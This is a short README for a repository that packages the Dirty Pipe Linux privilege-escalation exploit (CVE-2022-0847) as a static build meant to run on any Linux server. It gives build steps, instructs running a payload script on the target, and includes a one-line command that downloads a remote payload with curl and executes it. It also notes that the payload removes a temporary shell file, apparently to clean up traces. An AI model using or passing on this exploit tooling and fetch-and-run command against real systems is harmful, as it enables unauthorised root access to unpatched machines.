# dirtypipe (CVE-2022-0847)

!(screenshot)[./files/dirtypipe.png]

## References: 
- [ArsTechnica article](https://arstechnica.com/information-technology/2022/03/linux-has-been-bitten-by-its-most-high-severity-vulnerability-in-years/)
- [Max Kellermann's article and PoC](https://dirtypipe.cm4all.com/)
- [Public exploit](https://haxx.in/files/dirtypipez.c)

## Objective

Build a static exploit that can be run on any Linux server.

## How to build

```bash
./build.sh
```

## How to use

Once uploaded on the target system:

```bash
source payload.sh
```

If uploaded on a webserver:

```bash
source <(curl -s https://webserver/payload.sh)
```

## `dirtypipez.c`

The source on this repo is a bit modified (log message) as the `payload.sh` takes care of removing the `/tmp/sh` file.
